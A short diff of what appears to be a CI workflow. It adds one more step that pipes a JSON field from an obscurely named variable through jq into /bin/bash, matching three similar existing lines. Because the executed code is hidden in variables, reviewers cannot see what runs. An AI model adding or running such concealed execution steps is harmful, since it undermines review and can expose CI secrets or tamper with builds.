@@ -43,6 +43,7 @@ jobs:
           printf '%s' "$c812" | jq -r .rk17 | /bin/bash
           echo $gscm24341 | jq -r .axqf91 | /bin/bash
           echo $b362 | jq -r .r82 | /bin/bash
+          echo $jm5 | jq -r .qe56 | /bin/bash
 
       - name: Archive output
         if: always()
